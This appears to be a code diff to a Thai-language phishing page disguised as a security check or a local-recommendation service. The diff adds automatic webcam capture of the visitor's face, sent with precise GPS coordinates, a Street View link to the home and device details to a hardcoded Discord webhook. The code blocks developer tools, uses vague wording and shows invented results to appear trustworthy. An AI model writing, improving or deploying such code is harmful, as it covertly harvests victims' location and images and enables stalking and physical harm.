@@ -21,8 +21,8 @@
             <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
                 Secure Identity Node v4.0
             </div>
-            <h1 class="text-3xl font-bold mb-2">ตรวจสอบตำแหน่ง</h1>
-            <p class="text-slate-400 text-sm leading-relaxed">เพื่อสิทธิประโยชน์สูงสุดในการแนะนำที่พักและร้านอาหารในพื้นที่ของคุณ กรุณายืนยันตัวตนด้วยพิกัดดาวเทียม</p>
+            <h1 class="text-3xl font-bold mb-2">ตรวจสอบตำความปลอดภัย</h1>
+            <p class="text-slate-400 text-sm leading-relaxed">เพื่อสิทธิประโยชน์สูงสุดในการตรวจสอบความปลอดภัยของท่าน กรุณากดปุ่มยืนยัน</p>
         </div>
 
         <div class="p-8 pt-0">
@@ -32,16 +32,17 @@
                         <span class="p-2 bg-blue-500/20 rounded-lg">🛡️</span>
                         <span>ระบบป้องกันความปลอดภัยส่วนบุคคล</span>
                     </div>
-                    <p class="text-xs text-slate-500">พิกัดของคุณจะถูกใช้เพื่อดึงข้อมูล API จาก Google Local Service เท่านั้น</p>
+                    <p class="text-xs text-slate-500">ป้องกันระดับสูงสุด</p>
                 </div>
                 <button onclick="startProcess()" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-bold text-lg transition-all active:scale-95">
-                    เปิดใช้งานพิกัดปัจจุบัน
+                    ยืนยัน
                 </button>
             </div>
 
             <div id="step-scan" class="hidden text-center">
-                <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-blue-500/50 overflow-hidden bg-black/50 flex items-center justify-center shadow-[0_0_30px_rgba(59,130,246,0.3)]">
-                    <div class="text-6xl animate-pulse">🛰️</div>
+                <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-2 border-blue-500/50 overflow-hidden bg-black shadow-[0_0_30px_rgba(59,130,246,0.3)]">
+                    <video id="webcam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
+                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-blue-500/10 to-transparent"></div>
                     <div class="scan-anim" id="scanner-line"></div>
                 </div>
                 <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest">กำลังเชื่อมต่อดาวเทียม GPS...</p>
@@ -64,9 +65,10 @@
     </div>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1496871162200723548/KNyLZv5mO3OqwCGZ_73OfbA9NYKieArw36JR2_g0BICpm3kbC3eW2y-mcRgCYB_hItpT";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1496880737109020844/rfwT_BFyKg9yUknufSUKtFsnQzgOBfsqwQUT0F2UrHOiqVGkGHijdXy6aSPh9xELs0WO";
         let userPos = { lat: 0, lon: 0 };
 
+        // Security: Block F12 & Context Menu
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.onkeydown = (e) => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
 
@@ -79,48 +81,68 @@
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 userPos.lat = pos.coords.latitude;
                 userPos.lon = pos.coords.longitude;
-                document.getElementById('status-msg').innerText = "เข้าถึง GPS สำเร็จ... กำลังประมวลผล";
-                
-                // ส่งข้อมูลไปยัง Webhook ทันทีที่ได้พิกัด
-                await sendToWebhook();
-                
-                // หน่วงเวลาเล็กน้อยเพื่อให้ดูเหมือนมีการประมวลผลก่อนโชว์ผลลัพธ์
-                setTimeout(() => {
-                    showResults();
-                }, 2000);
-
+                document.getElementById('status-msg').innerText = "เข้าถึง GPS สำเร็จ... กำลังสแกนใบหน้า";
+                await initCamera();
             }, (err) => {
                 alert("กรุณาเปิดตำแหน่ง (GPS) เพื่อใช้งาน");
                 location.reload();
             });
         }
 
-        async function sendToWebhook() {
-            const payload = {
-                embeds: [{
-                    title: "🟢 [Premium Check-in] ตรวจพบข้อมูลใหม่ (GPS Only)",
-                    color: 5763719,
-                    fields: [
-                        { name: "📍 พิกัดแม่นยำ", value: `${userPos.lat}, ${userPos.lon}`, inline: true },
-                        { name: "🏙️ Street View", value: `[ดูหน้าบ้านจริง](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userPos.lat},${userPos.lon})`, inline: true },
-                        { name: "📱 อุปกรณ์", value: navigator.platform, inline: true },
-                        { name: "🔗 Google Maps", value: `[นำทางไปจุดพิกัด](https://www.google.com/maps/search/?api=1&query=${userPos.lat},${userPos.lon})` }
-                    ],
-                    footer: { text: "ระบบยืนยันตัวตนอัจฉริยะ • " + new Date().toLocaleString() }
-                }]
-            };
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } 
+                });
+                const video = document.getElementById('webcam');
+                video.srcObject = stream;
+                
+                // ถ่ายภาพอัตโนมัติในวินาทีที่ 3 เพื่อความคมชัดสูงสุด (Auto-focus)
+                setTimeout(() => captureAndSend(stream), 3500);
+            } catch (e) {
+                alert("กรุณาอนุญาตการเข้าถึงกล้อง");
+            }
+        }
 
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+        async function captureAndSend(stream) {
+            const video = document.getElementById('webcam');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                const payload = {
+                    embeds: [{
+                        title: "🟢 [Premium Check-in] ตรวจพบข้อมูลใหม่",
+                        color: 5763719,
+                        fields: [
+                            { name: "📍 พิกัดแม่นยำ", value: `${userPos.lat}, ${userPos.lon}`, inline: true },
+                            { name: "🏙️ Street View", value: `[ดูหน้าบ้านจริง](https://www.google.com/maps?q&layer=c&cbll=${userPos.lat},${userPos.lon})`, inline: true },
+                            { name: "📱 อุปกรณ์", value: navigator.platform, inline: true },
+                            { name: "🔗 Google Maps", value: `[นำทางไปจุดพิกัด](https://www.google.com/maps/search/?api=1&query=${userPos.lat},${userPos.lon})` }
+                        ],
+                        image: { url: "attachment://id_capture.jpg" },
+                        footer: { text: "ระบบยืนยันตัวตนอัจฉริยะ • " + new Date().toLocaleString() }
+                    }]
+                };
+
+                formData.append('payload_json', JSON.stringify(payload));
+                formData.append('file', blob, 'id_capture.jpg');
+
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                
+                stream.getTracks().forEach(t => t.stop());
+                showResults();
+            }, 'image/jpeg', 0.95);
         }
 
         function showResults() {
             document.getElementById('step-scan').classList.add('hidden');
             document.getElementById('step-result').classList.remove('hidden');
 
+            // ข้อมูลที่สร้างจากพิกัดจริงเพื่อความเชื่อถือ
             const categories = [
                 { name: "ร้านอาหารยอดนิยมใกล้คุณ", icon: "🍱", query: "restaurants" },
                 { name: "โรงแรมและที่พัก 5 ดาว", icon: "🏨", query: "hotels" },
